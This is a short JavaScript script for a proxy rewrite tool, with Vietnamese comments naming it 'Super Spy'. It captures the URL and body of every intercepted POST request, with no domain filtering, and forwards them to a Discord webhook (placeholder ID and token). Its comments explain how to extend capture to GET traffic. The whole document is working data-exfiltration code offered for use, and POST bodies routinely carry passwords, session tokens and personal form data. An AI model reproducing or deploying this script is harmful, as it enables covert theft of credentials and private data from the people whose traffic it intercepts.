/**
 * SUPER SPY JS - BẮT TẤT CẢ
 * Không lọc tên miền, không lọc ảnh. Có gì gửi nấy.
 */

var url = $request.url;
var body = $request.body;
var method = $request.method;

// CHỈ GỬI KHI LÀ POST (Để tránh spam quá mức chịu đựng)
// Nếu bạn muốn bắt cả GET (xem web bình thường) thì xóa điều kiện if này đi
if (method === "POST") {
    sendToDiscord(url, body);
}

$done({});

function sendToDiscord(targetUrl, capturedData) {
    // THAY WEBHOOK CỦA BẠN VÀO ĐÂY
    var discordUrl = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"; 
    
    var data = {
        "username": "Super Spy",
        "content": "Captured: `" + targetUrl + "`\nData: ```" + capturedData + "```"
    };

    $task.fetch({
        url: discordUrl,
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    }, function(){});
}
